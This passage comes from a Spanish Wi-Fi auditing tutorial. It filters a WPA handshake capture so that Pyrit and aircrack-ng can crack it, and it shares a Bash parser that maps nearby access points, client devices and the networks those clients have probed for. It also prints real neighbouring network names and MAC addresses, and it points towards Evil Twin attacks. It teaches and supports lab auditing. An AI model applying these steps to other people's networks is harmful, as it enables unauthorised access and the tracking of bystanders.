embargo, vemos que ahora en el campo 'ESSID' de la red nos pone **None**. Esto es así dado que el campo
**eapol** no guarda ese tipo de información. 

Ahora es cuando recapitulamos, ¿qué tipo de paquete es el que
guarda esa información?... exacto, los paquetes **Beacon**, por tanto podemos ajustar un poco más nuestro
filtro para seguir desechando paquetes no necesarios pero filtrando algo más de información en lo referente a
nuestro AP víctima, haciendo uso para ello del operador **OR**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || eapol" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
```

En este caso, vemos que ha habido un paquete Beacon capturado, indicando el nombre del ESSID al final de la
primera línea.

Si exportamos dicha captura y analizamos ahora desde **Pyrit**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || eapol" 2>/dev/null -w filteredCapture
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r filteredCapture analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'filteredCapture' (1/1)...
Parsed 5 packets (5 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
```

El campo **'None'** es sustituido por el **ESSID** de la red. 

**ANOTACIÓN**: En mi opinión, recomiendo hacer uso del siguiente filtrado para este tipo de casos, donde
además de los paquetes **Beacon** es preferible filtrar también por los paquetes **Probe Response**.

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
    3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
    5   0.586817 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    6   0.590400 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    7   0.594497 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    8   0.596543 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
    9   0.600640 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   10   0.602688 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   11   0.605759 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   12   0.610367 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   13   4.188928 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
  112   8.252481 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  113   8.259649 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  114   8.261696 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab
  115   8.272449 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
```

Otra buena práctica y consejo es acostumbrarnos a hacer estas filtraciones indicando el BSSID de la red
objetivo, así evitamos confusiones y estar filtrando paquetes que no corresponden.

Para este caso, como sabemos que la dirección MAC del AP es **20:34:fb:b1:c5:53** (lo podemos ver desde
Pyrit), una buena práctica sería hacer lo siguiente:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
    3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
    5   0.586817 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    6   0.590400 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    7   0.594497 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    8   0.596543 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
    9   0.600640 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   10   0.602688 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   11   0.605759 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   12   0.610367 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   13   4.188928 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
  112   8.252481 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  113   8.259649 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  114   8.261696 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab
  115   8.272449 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
```

Por último y para que no os asustéis, fijaros qué curioso:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -w filteredCapture 2>/dev/null
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng filteredCapture 
Opening filteredCapture wait...
Unsupported file format (not a pcap or IVs file).
Read 0 packets.

No networks found, exiting.


Quitting aircrack-ng...
```

La suite de **aircrack-ng**, debería ser capaz de distinguirnos el punto de acceso y el Handshake capturado,
hemos visto que **Pyrit** lo detecta sin problemas, ¿por qué aircrack no?, la respuesta es sencilla. A la hora
de exportar la captura desde **tshark**, si queremos que **aircrack** nos lo interprete, debemos de
especificar en el modo de exportación para la captura el formato **pcap**, de la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -R "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -2 -w filteredCapture -F pcap 2>/dev/null
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng filteredCapture 
Opening filteredCapture wait...
Read 19 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening filteredCapture wait...
Read 19 packets.

1 potential targets
```

Destacar que he hecho uso del parámetro '**-R**' en vez del '**-Y**' porque estoy haciendo uso del parámetro
'**-2**', con el objetivo de hacer un doble pase durante la fase de análisis. Esta opción es incluso mejor,
dado que se recopilan las anotaciones. El uso del parámetro '**-R**' requiere de forma obligatoria que
añadamos el parámetro '**-2**'.

Os dejo por aquí una pequeña aclaratoria de la utilidad de estos parámetros: <a href="https://osqa-ask.wireshark.org/questions/19794/what-is-the-meaning-of-two-pass-analysis">Interés</a>

### Parseador para redes del entorno

Hasta ahora hemos estado parseando redes específicas, pero, ¿no te has parado a pensar en que también
podríamos hacer esto?:

* airodump-ng wlan0mon -w Captura

Es decir, capturar todo el tráfico de todas las redes disponibles en el entorno en un fichero. ¿Por qué íbamos
a querer hacer esto?, bueno, desde **airodump-ng**, en el momento de escanear las redes del entorno, lo vemos
todo claro, bien representado, sin embargo, una vez las evidencias son exportadas al fichero especificado, ya
la manera de representar los datos no son los mismos.

Por ello, os comparto el siguiente script en Bash:

```bash
#!/bin/bash

if [[ "$1" && -f "$1" ]]; then
    FILE="$1"
else
    echo -e '\nEspecifica el fichero .csv a analizar\n';
    echo 'Uso:';
    echo -e "\t./parser.sh Captura-01.csv\n";
    exit  
fi

test -f oui.txt 2>/dev/null

if [ "$(echo $?)" == "0" ]; then
  
    echo -e "\n\033[1mNúmero total de puntos de acceso: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE | wc -l`\e[0m"
    echo -e "\033[1mNúmero total de estaciones: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE | wc -l`\e[0m"
    echo -e "\033[1mNúmero total de estaciones no asociadas: \033[0;31m`grep -E '(not associated)' $FILE | wc -l`\e[0m"
    
    echo -e "\n\033[0;36m\033[1mPuntos de acceso disponibles:\e[0m\n"
    
    while read -r line ; do
    
        if [ "`echo "$line" | cut -d ',' -f 14`" != " " ]; then
            echo -e "\033[1m" `echo -e "$line" | cut -d ',' -f 14` "\e[0m"
        else
            echo -e " \e[3mNo es posible obtener el nombre de la red (ESSID)\e[0m"
        fi
    
        fullMAC=`echo "$line" | cut -d ',' -f 1`
        echo -e "\tDirección MAC: $fullMAC"
    
        MAC=`echo "$fullMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result="$(grep -i -A 1 ^$MAC ./oui.txt)";
    
        if [ "$result" ]; then
            echo -e "\tVendor: `echo "$result" | cut -f 3`"
        else
            echo -e "\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m"
        fi
    
        is5ghz=`echo "$line" | cut -d ',' -f 4 | grep -i -E '36|40|44|48|52|56|60|64|100|104|108|112|116|120|124|128|132|136|140'`
    
        if [ "$is5ghz" ]; then
            echo -e "\t\033[0;31mOpera en 5 GHz!\e[0m"
        fi
    
        printonce="\tEstaciones:"
    
        while read -r line2 ; do
    
            clientsMAC=`echo $line2 | grep -E "$fullMAC"`
            if [ "$clientsMAC" ]; then
    
                if [ "$printonce" ]; then
                    echo -e $printonce
                    printonce=''
                fi
    
                echo -e "\t\t\033[0;32m" `echo $clientsMAC | cut -d ',' -f 1` "\e[0m"
                MAC2=`echo "$clientsMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
                result2="$(grep -i -A 1 ^$MAC2 ./oui.txt)";
    
                if [ "$result2" ]; then
                    echo -e "\t\t\tVendor: `echo "$result2" | cut -f 3`"
                    ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
                    warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
                    if [ "$ismobile" ]; then
                        echo -e "\t\t\t\033[0;33mEs probable que se trate de un dispositivo móvil\e[0m"
                    fi
    
                    if [ "$warning" ]; then
                        echo -e "\t\t\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m"
                    fi
    
                else
                    echo -e "\t\t\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m"
                fi
    
                probed=`echo $line2 | cut -d ',' -f 7`
    
                if [ "`echo $probed | grep -E [A-Za-z0-9_\\-]+`" ]; then
                    echo -e "\t\t\tRedes a las que el dispositivo ha estado asociado: $probed"
                fi        
            fi
        done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE)
        
    done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)
    
    echo -e "\n\033[0;36m\033[1mEstaciones no asociadas:\e[0m\n"
    
    while read -r line2 ; do
    
        clientsMAC=`echo $line2  | cut -d ',' -f 1`
    
        echo -e "\033[0;31m" `echo $clientsMAC | cut -d ',' -f 1` "\e[0m"
        MAC2=`echo "$clientsMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result2="$(grep -i -A 1 ^$MAC2 ./oui.txt)";
    
        if [ "$result2" ]; then
            echo -e "\tVendor: `echo "$result2" | cut -f 3`"
            ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
            warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
            if [ "$ismobile" ]; then
                echo -e "\t\033[0;33mEs probable que se trate de un dispositivo móvil\e[0m"
            fi
            if [ "$warning" ]; then
                echo -e "\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m"
            fi
        else
            echo -e "\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m"
        fi
    
        probed=`echo $line2 | cut -d ',' -f 7`
    
        if [ "`echo $probed | grep -E [A-Za-z0-9_\\-]+`" ]; then
            echo -e "\tRedes a las que el dispositivo ha estado asociado: $probed"
        fi        
    
    done < <(grep -E '(not associated)' $FILE)
else
    echo -e "\n[!] Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt\n"
fi
```

Aprovechando el fichero '.csv' generado automáticamente tras correr **airodump** sobre la red objetivo,
podemos hacer uso de este parseador para representar toda la información de los datos capturados.

Correr el script es bastante sencillo:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #./file.sh 

Especifica el fichero .csv a analizar

Uso:
	./parser.sh Captura-01.csv

┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #./file.sh captura-01.csv 

[!] Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt
```

Como vemos, la primera vez que lo corremos, en caso de no contar con el fichero 'oui.txt', se genera un
pequeño aviso para avisar de que necesitamos descargarlo para correr el script, pues en caso contrario los
datos no serán bien representados.

Por tanto:

* wget http://standards-oui.ieee.org/oui/oui.txt

Una vez hecho, ya podemos ejecutar el script, obteniendo los siguientes resultados:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #./file.sh captura-01.csv 

Número total de puntos de acceso: 43
Número total de estaciones: 5
Número total de estaciones no asociadas: 5

Puntos de acceso disponibles:

 Invitados 
	Dirección MAC: 4C:96:14:2C:42:82
	Vendor: Juniper Networks
 MiFibra-CECC 
	Dirección MAC: 44:FE:3B:FE:CE:CE
	Vendor: Arcadyan Corporation
 WIFI_EXT 
	Dirección MAC: 4C:96:14:2C:42:86
	Vendor: Juniper Networks
 MOVISTAR_A908 
	Dirección MAC: FC:B4:E6:99:A9:09
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 00:9A:CD:E7:C0:24
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MiFibra-91BD 
	Dirección MAC: 70:4F:57:9F:9A:8B
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 Interno 
	Dirección MAC: 4C:96:14:2C:42:80
	Vendor: Juniper Networks
 MOVISTAR_171B 
	Dirección MAC: 78:29:ED:9D:17:1C
	Vendor: ASKEY COMPUTER CORP
 JAZZTEL_1301. 
	Dirección MAC: 00:B6:B7:36:06:0C
	Vendor: Información no encontrada en la base de datos
 WIFI_EXT2 
	Dirección MAC: 44:48:C1:F1:97:03
	Vendor: Hewlett Packard Enterprise
 Interno 
	Dirección MAC: 4C:96:14:2C:47:40
	Vendor: Juniper Networks
	Estaciones:
		 4C:96:14:2C:47:40 
			Vendor: Juniper Networks
			Redes a las que el dispositivo ha estado asociado: MAPFRE
 iMovil 
	Dirección MAC: 4C:96:14:27:B9:84
	Vendor: Juniper Networks
 MOVISTAR_9E71 
	Dirección MAC: 94:91:7F:0E:9E:72
	Vendor: ASKEY COMPUTER CORP
 MiFibra-7BB4 
	Dirección MAC: 94:6A:B0:60:7B:B6
	Vendor: Arcadyan Corporation
 MOVISTAR_D8C1 
	Dirección MAC: 1C:B0:44:50:D8:C2
	Vendor: ASKEY COMPUTER CORP
 MiFibra-226A 
	Dirección MAC: 94:6A:B0:9B:22:6C
	Vendor: Arcadyan Corporation
 MOVISTAR_4DE8 
	Dirección MAC: 78:29:ED:22:4D:E9
	Vendor: ASKEY COMPUTER CORP
 Interno 
	Dirección MAC: 4C:96:14:27:B9:80
	Vendor: Juniper Networks
 WIFI_EXT 
	Dirección MAC: 4C:96:14:27:B9:86
	Vendor: Juniper Networks
 Invitados 
	Dirección MAC: A8:D0:E5:C1:C9:42
	Vendor: Juniper Networks
 iMovil 
	Dirección MAC: A8:D0:E5:C1:C9:44
	Vendor: Juniper Networks
 Invitados 
	Dirección MAC: 4C:96:14:27:B9:82
	Vendor: Juniper Networks
 WIFI_EXT 
	Dirección MAC: 4C:96:14:2C:47:46
	Vendor: Juniper Networks
 Interno 
	Dirección MAC: A8:D0:E5:C1:C9:40
	Vendor: Juniper Networks
 vodafone18AC 
	Dirección MAC: 24:DF:6A:10:18:B4
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MOVISTAR_3126 
	Dirección MAC: CC:D4:A1:0C:31:28
	Vendor: MitraStar Technology Corp.
 WIFI_EXT 
	Dirección MAC: A8:D0:E5:C1:C9:46
	Vendor: Juniper Networks
 Orange-A238 
	Dirección MAC: 50:7E:5D:2F:A2:3A
	Vendor: Arcadyan Technology Corporation
 MOVISTAR_1083 
	Dirección MAC: F8:8E:85:43:10:84
	Vendor: Comtrend Corporation
 MIWIFI_2G_2Xhs 
	Dirección MAC: E4:CA:12:96:21:FE
	Vendor: zte corporation
 Interno2 
	Dirección MAC: 44:48:C1:F1:96:A0
	Vendor: Hewlett Packard Enterprise
 WLAN_4A4C 
	Dirección MAC: 00:1A:2B:AC:0B:CF
	Vendor: Ayecom Technology Co., Ltd.
 iMovil2 
	Dirección MAC: 44:48:C1:F1:96:A4
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_2F95 
	Dirección MAC: E8:D1:1B:21:2F:96
	Vendor: ASKEY COMPUTER CORP
 MOVISTAR_5A18 
	Dirección MAC: A4:2B:B0:FB:90:D1
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 WIFI_EXT2 
	Dirección MAC: 44:48:C1:F1:96:A3
	Vendor: Hewlett Packard Enterprise
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 44:48:C1:F1:96:A1
	Vendor: Hewlett Packard Enterprise
 VILLACRISIS 
	Dirección MAC: 84:16:F9:5B:45:B8
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 44:48:C1:F1:96:A2
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_4C30 
	Dirección MAC: E2:41:36:08:4C:30
	Vendor: Información no encontrada en la base de datos
 TP-LINK_79D4 
	Dirección MAC: D4:6E:0E:F8:79:D4
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 MOVISTAR_1677 
	Dirección MAC: 1C:B0:44:D4:16:78
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 4C:1B:86:02:54:EA
	Vendor: Arcadyan Corporation

Estaciones no asociadas:

 34:12:F9:77:49:5E 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo móvil
	Redes a las que el dispositivo ha estado asociado: BUY&RECICLE
 00:24:2B:BC:4E:57 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 10:44:00:9C:76:66 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo móvil
 4C:96:14:2C:47:40 
	Vendor: Juniper Networks
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 AC:D1:B8:17:91:C0 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
```

¡Qué belleza!, de bastante utilidad incluso para visualizar los paquetes **Probe Request**, contemplando las
redes a las que el cliente ha estado conectado en el pasado, pudiendo así posteriormente efectuar un ataque de
tipo **Evil Twin**, que veremos más adelante.

### Análisis de paquetes de red con tshark

Hasta ahora hemos estado viendo diversos modos de filtro con **tshark** pero sin dedicar una sección
específica para los modos de filtro. A continuación, vamos a ver distintos modos de filtrado, de utilidad para
el análisis de paquetes y capturas:

* Paquetes Probe Request

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
  175 22.140053472 JuniperN_2c:47:40 → Broadcast    802.11 178 Probe Request, SN=2376, FN=0, Flags=........C, SSID=WLAN_C311
  185 26.153075819 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1959, FN=0, Flags=........C, SSID=Wlan1
  186 26.234864238 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1963, FN=0, Flags=........C, SSID=Wlan1
  187 26.245021241 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1964, FN=0, Flags=........C, SSID=Wlan1
  188 26.257907684 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1965, FN=0, Flags=........C, SSID=Wlan1
  189 26.268055504 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1966, FN=0, Flags=........C, SSID=Wlan1
```

* Paquetes Probe Response

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==5" 2>/dev/null
    2   1.617473 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1872, FN=0, Flags=........, BI=100, SSID=hacklab
    5   1.628735 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1874, FN=0, Flags=........, BI=100, SSID=hacklab
   10   3.698368 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2340, FN=0, Flags=........, BI=100, SSID=hacklab
   12   3.701951 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2341, FN=0, Flags=........, BI=100, SSID=hacklab
   14   3.756735 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2342, FN=0, Flags=........, BI=100, SSID=hacklab
   16   3.759295 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2343, FN=0, Flags=........, BI=100, SSID=hacklab
```

* Paquetes Association Request

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==0" 2>/dev/null
   22   5.041479 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 122 Association Request, SN=227, FN=0, Flags=........, SSID=hacklab
```

* Paquetes Association Response

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==1" 2>/dev/null
   24   5.049663 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 127 Association Response, SN=2346, FN=0, Flags=........
```

* Paquetes Beacon

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==8" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1855, FN=0, Flags=........, BI=100, SSID=hacklab
```

* Paquete Authentication

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==11" 2>/dev/null
   18   5.033280 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 30 Authentication, SN=226, FN=0, Flags=........
   20   5.035840 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 30 Authentication, SN=2344, FN=0, Flags=........
```

* Paquetes Deauthentication

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==12" 2>/dev/null
  200 39.994017471 AskeyCom_d4:16:78 → Broadcast    802.11 38 Deauthentication, SN=0, FN=0, Flags=........
  201 39.994777432 AskeyCom_d4:16:78 → Broadcast    802.11 39 Deauthentication, SN=0, FN=0, Flags=........
  202 39.996199413    Broadcast → AskeyCom_d4:16:78 802.11 38 Deauthentication, SN=1, FN=0, Flags=........
  203 39.996798243    Broadcast → AskeyCom_d4:16:78 802.11 39 Deauthentication, SN=1, FN=0, Flags=........
  205 39.999554640 AskeyCom_d4:16:78 → Broadcast    802.11 38 Deauthentication, SN=2, FN=0, Flags=........
  206 40.000174666 AskeyCom_d4:16:78 → Broadcast    802.11 39 Deauthentication, SN=2, FN=0, Flags=........
```

* Paquetes Dissasociation

```bash
tshark -i wlan0mon -Y "wlan.fc.type_subtype==10" 2>/dev/null # Para este caso no pude pillar ninguno jeje
```

* Paquetes Clear To Send (CTS)

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==28" 2>/dev/null
  183 11.333769733              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  186 11.334796342              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  189 11.336432358              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  192 11.339134653              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  196 11.352502740              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  199 11.357122880              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  204 11.362841524              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  222 11.418923972              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
